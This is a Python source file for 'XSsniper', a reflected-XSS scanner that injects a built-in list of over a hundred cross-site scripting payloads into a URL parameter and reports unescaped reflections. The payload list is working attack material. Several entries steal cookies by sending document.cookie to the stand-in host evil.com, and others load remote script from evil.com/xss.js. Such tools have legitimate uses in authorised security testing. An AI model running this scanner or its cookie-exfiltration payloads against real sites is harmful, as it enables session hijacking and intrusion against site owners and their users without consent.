#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSsniper - Reflected XSS Scanner
Version: 0.2
Legal use only
"""

import requests
import argparse
from urllib.parse import quote, urlparse, parse_qs, urlencode
import time
import sys
from datetime import datetime

# ──────────────────────────────────────────────#
#               PAYLOADS                        #
# ──────────────────────────────────────────────#
PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "data:text/html,<script>alert('XSS')</script>",
    "<img src=x://x onerror=alert('XSS')>",
    "\"><script>alert(1)</script>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<audio src=x onerror=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<math><mtext onclick=alert('XSS')>",
    "<xmp><script>alert('XSS')</script>",
    "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')>\">",
    "<script src=//evil.com/xss.js></script>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<form><button formaction=javascript:alert('XSS')>",
    "<isindex action=javascript:alert('XSS')>",
    "<base href=javascript:alert('XSS')//>",
    "<script src=data:;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>",
    "&#x3Cscript&#x3Ealert('XSS')&#x3C/script&#x3E",
    "<SCRIPT>alert('XSS')</SCRIPT>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<sCrIpT>alert('XSS')</sCrIpT>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "\" onclick=\"alert('XSS')",
    "' onclick=\"alert('XSS')",
    "\"><img src=x onerror=alert('XSS')>",
    "';alert('XSS');//",
    "\"><svg onload=alert('XSS')>",
    "<script>alert`1`</script>",
    "<script>alert(1)//</script>",
    "<script>/*--></script><img src=x onerror=alert('XSS')>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script>console.log(1)</script>",
    "<script>eval('alert(1)')</script>",
    "<script>new Function('alert(1)')()</script>",
    "<svg/onload=alert('XSS')>",
    "<svg onload=alert(String.fromCharCode(88,83,83))>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"+/onmouseover=1/+/[*/[]/+alert(32)//'>",
    "<img src=x onerror=prompt(1)>",
    "<details ontoggle=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<source src=x onerror=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<menuitem onmouseover=alert(1)>",
    "<template><script>alert(1)</script>",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "<form action=javascript:alert(1)>",
    "<body><script>alert(1)</script>",
    "\"><body onload=alert(1)>",
    "<style>@import'javascript:alert(1)';</style>",
    "<style>body{background:url(javascript:alert(1))}</style>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
    "<style/onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<bgsound src=javascript:alert(1)>",
    "<br size=\"&{alert('XSS')}\">",
    "<lFiE><sVg/oNmLoAd=aleRt(1)>",
    "<SCRIPT a=\">\">alert(1)</SCRIPT>",
    "<SCRIPT>a=b</SCRIPTc>",
    "<SCRIPT>alert(1) </SCRIPT>",
    "<x><SCRIPT>alert(1)</x>",
    "<SCRIPT><IMG SRC=javascript:alert('XSS')>",
    "<SCRIPT SRC=//evil.com/xss.js></SCRIPT>",
    "<SCRIPT SRC=http://evil.com/xss.js?>",
    "<IMG \"\"&#34;&#62;<SCRIPT>alert(&#34;XSS&#34;)</SCRIPT>&#34;\"",
    "<IMG SRC=javascript:alert('XSS')>",
    "<IMG SRC=# onmouseover=alert('xxs')>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
    "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000110&#0000116&#0000040&#0000097&#0000108&#0000101&#0000114&#0000160&#000039&#0000&#0000577&#00000041&#00000062;",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
    "<IMG LOWSRC=\"javascript:alert('XSS')\">",
    "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
    "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
    "<TD BACKGROUND=\"javascript:alert('XSS')\">",
    "<SCRIPT>alert(\"XSS\")</SCRIPT>",
    "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<SCRIPT a=\\x3Ealert(String.fromCharCode(88,83,83))\\x3C/SCRIPT>",
    "<SCRIPT>alert(&\\#74;&\\#97;&\\#118;&\\#97;&\\#83;&\\#99;&\\#114;&\\#105;&\\#112;&\\#116;&\\#58;&\\#97;&\\#108;&\\#101;&\\#114;&\\#116;&\\#40;&\\#39;&\\#88;&\\#83;&\\#83;&\\#39;&\\#41;&\\#41;&\\#x29;&\\#x3E)</SCRIPT>",
    "<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
    "<IMG SRC=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">",
    "<IMG SRC=&#000006a&#00000061&#00000076&#00000061&#00000073&#00000063&#00000072&#00000069&#00000070&#00000074&#0000003a&#00000061&#0000006c&#00000065&#00000072&#00000074&#00000028&#00000039&#00000058&#00000053&#00000053&#00000027&#00000029>",
    "<IMG SRC=\"javascript:alert('XSS')\">",
    "<IMG SRC=`javascript:alert('XSS')>",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=javascript:alert('\\u0058\\u0053\\u0053')>",
    "<IMG SRC=javascript:alert('\\x58\\x53\\x53')>",
    "<IMG SRC=javascript:alert(String.fromCharCode(74,97,118,97,83,99,114,105,112,116,58,97,108,101,114,116,40,39,88,83,83,39,41))>",
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0a;ascript:alert('XSS');\">",
    "<IMG SRC=\"jav&#x0d;ascript:alert('XSS');\">",
    "<IMG SRC=\"&#14;javascript:alert('XSS');\">",
    "<SCRIPT SRC=\"http://evil.com/xss.js\"></SCRIPT>",
    "<SCRIPT SRC=\"http://evil.com/xss.js?<B>\">",
    "<SCRIPT SRC=//evil.com/xss.js>",
    "<SCRIPT SRC=`data:text/javascript,alert('XSS')`></SCRIPT>",
    "<SCRIPT>document.write(\"<SCRI\" + \"PT SRC='http://evil.com/xss.js'></SCRIPT>\")</SCRIPT>",
    "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
    "<XML ID=\"x\"><X><SCRIPT>alert('XSS')</SCRIPT></X></XML>",
    "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
    "<STYLE>.XSS{background:url(\"javascript:alert('XSS')\");}</STYLE>",
    "<STYLE>.XSS{background:url(javascript:alert('XSS'));}</STYLE>",
    "<STYLE>.XSS{background:url('java\\74script:alert(\"XSS\")');}</STYLE>",
    "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
    "<LINK REL=\"stylesheet\" HREF=\"java\\74script:alert('XSS');\">",
    "<STYLE>@import'java\\74script:alert(\"XSS\")';</STYLE>",
    "<META HTTP-EQUIV=\"Link\" Content=\"<LINK REL=stylesheet HREF='javascript:alert(\\\"XSS\\\")'>\">",
    "<STYLE><!--</STYLE><SCRIPT>alert('XSS')</SCRIPT>",
    "<IMG SRC=\"javascript:alert('XSS')\" QUOTE=\">",
    "<SCRIPT>prompt(document.domain)</SCRIPT>",
    "<script>fetch('/steal?cookie='+document.cookie)</script>",
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
    "<img src=x onerror=\"document.location='http://evil.com/log?input='+encodeURIComponent(this.parentNode.innerHTML)\">",
    "<svg onload=\"fetch('http://evil.com/?'+btoa(document.cookie))\">"
]

# SETTINGS
DELAY = 0.6                 # seconds between requests
TIMEOUT = 12                # request timeout
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

HEADERS = {"User-Agent": USER_AGENT}

BANNER = f"""
╔════════════════════════════════════════════╗
║             XSSNIPER v0.2                  ║
║   reflected XSS scanner (GET parameters)   ║
║   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                      ║
╚════════════════════════════════════════════╝
"""

# interesting http codes
INTERESTING_CODES = {500, 501, 502, 503, 403, 406, 429}

# ANSI color codes (for --color option)
COLORS = {
    'green': '\033[92m',
    'red': '\033[91m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'reset': '\033[0m'
}
def is_likely_reflected(payload: str, response_text: str) -> bool:
    """Simple heuristic: the payload is in the response and there is no explicit HTML escaping"""
    if not payload:
        return False
    
    # Payload found in response
    if payload in response_text or payload.lower() in response_text.lower():
        # Check if it is escaped by typical means
        escaped_variants = [
            payload.replace("<", "&lt;"),
            payload.replace(">", "&gt;"),
            payload.replace('"', "&quot;"),
            payload.replace("'", "&#x27;"),
            payload.replace("'", "&#39;"),
        ]
        
        for escaped in escaped_variants:
            if escaped in response_text:
                return False  # likely escaped
        
        return True
    
    return False


def load_payloads_from_file(filepath: str) -> list:
    """Loads payloads from a file. Ignores blank lines and comments. (#)."""
    payloads = []
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append(line)
        return payloads
    except FileNotFoundError:
        print(f"[!] FileNotFound: {filepath}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error loading payloads from file: {filepath}: {e}")
        sys.exit(1)
 

def sniper(url_template: str, payloads: list, use_color: bool = False, delay: float = 0.6):
    def colorize(text, color_name):
        if use_color and color_name in COLORS:
            return f"{COLORS[color_name]}{text}{COLORS['reset']}"
        return text
    
   
    print(BANNER)
    print(f"[+] Target: {url_template}")
    print(f"[+] Payloads in database: {len(payloads)}\n")
    
    found = 0       # counter for potential XSS findings
    successful = [] # list to store successful payloads for later review

    for idx, payload in enumerate(payloads, 1):
        encoded = quote(payload, safe="=&/")
        test_url = url_template.replace("FUZZ", encoded) if "FUZZ" in url_template else url_template + encoded
        
        print(f"[{idx:02d}/{len(payloads)}] → {payload[:55]}{'...' if len(payload)>55 else ''}", end=" ", flush=True)


        try:
            r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=True)
            
            if is_likely_reflected(payload, r.text):
                print(colorize("  → ✅ [XSS!] ", "green"))                    # potential XSS found (payload reflected without obvious escaping)
                print(f"      URL: {test_url}")
                print(f"      Code: {colorize(str(r.status_code), 'green')} | Length: {len(r.text):,} bytes")
                print(f"      Payload: {payload}\n")
                found += 1
                successful.append({
                    'idx': idx,
                    'payload': payload,
                    'url': test_url,
                    'code': r.status_code,
                    'length': len(r.text)
                })
            elif r.status_code in INTERESTING_CODES:
                print(colorize(f"🛡️ {r.status_code} (interesting)", "magenta"))
            else:
                print(colorize(f"  → ❌ {r.status_code}", "red"))           # not found or not reflected
                
        except requests.exceptions.Timeout:
            print(colorize("  → ⏰ Timeout", "blue"))                            # timeout 
        except requests.exceptions.ConnectionError:
            print(colorize("  → 🔌 Connection error", "cyan"))                   # connection error
        except requests.exceptions.RequestException as e:
            print(colorize(f"  → ⚠️ Error: {str(e)[:60]}", "yellow"))       # other request exceptions (truncated for readability)
        
        time.sleep(delay) # delay between requests
    
    print("\n" + "═" * 60)
    if found > 0:
        print(colorize(f"[!] Found potential XSS: {found}", "green"))
        print("\n📋 LIST OF SUCCESSFUL PAYLOADS:")
        for item in successful:
            print(f"  [{item['idx']:02d}] {item['payload'][:70]}")
            print(f"      URL: {item['url']}")
            print(f"      Code: {colorize(str(item['code']), 'yellow')} | Length: {item['length']:,} bytes\n")
        print("    Check MANUALLY in browser (many WAF/filters may block some payloads)")
    else:
        print(colorize("[-] Nothing suspicious detected with current payload set", "red"))
    print("═" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="XSSNIPER — fast reflected XSS tester",
        epilog="Examples:\n"
               "  python3 xssniper.py -u 'http://site.com/search?q=FUZZ',\n"
               "    python3 xssniper.py -u 'http://vuln.site/page?search=FUZZ' -f payloads.txt --append --color,\n"
    )
    
    parser.add_argument("-u", "--url", required=True,
                        help="URL with injection point. Use FUZZ or just append at the end")
    parser.add_argument("-f", "--payloads-file",
                        help="File with custom payloads (one per line)")
    parser.add_argument("--append", action="store_true",
                        help="Append payloads from file to built-in list (default: replace)")
    parser.add_argument("--color", action="store_true",
                        help="Enable colored output (ANSI colors)")
    parser.add_argument("-d", "--delay", type=float, default=0.6,
                        help="Delay between requests in seconds (default: 0.6)")
    
    args = parser.parse_args()
    
    url = args.url.strip()
    
    if "FUZZ" not in url and not url.endswith("=") and not url.endswith("?") and "&" not in url[-10:]:
        print("[!] It is recommended to specify FUZZ or at least an = sign at the end of the parameter")
        print("    Example: http://example.com/search.php?test=FUZZ")
        sys.exit(1)


    payloads_to_use = PAYLOADS
    source_desc = "built-in payloads"
    use_color = args.color
    custom_delay = args.delay

    if args.delay <= 0:
        print("[!] Delay must be positive. Using default 0.6.")
        custom_delay = 0.6
    else:
        custom_delay = args.delay

    if args.payloads_file:
        file_payloads = load_payloads_from_file(args.payloads_file)
        if args.append:
            payloads_to_use = PAYLOADS + file_payloads
            source_desc = f"built-in + {len(file_payloads)} from file"
        else:
            payloads_to_use = file_payloads  
            source_desc = f"only from file ({len(file_payloads)})"
    
    print(f"[+] Using: {source_desc}")


    try:
        sniper(url, payloads_to_use, use_color, custom_delay)
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(0)
   

if __name__ == "__main__":
    main()
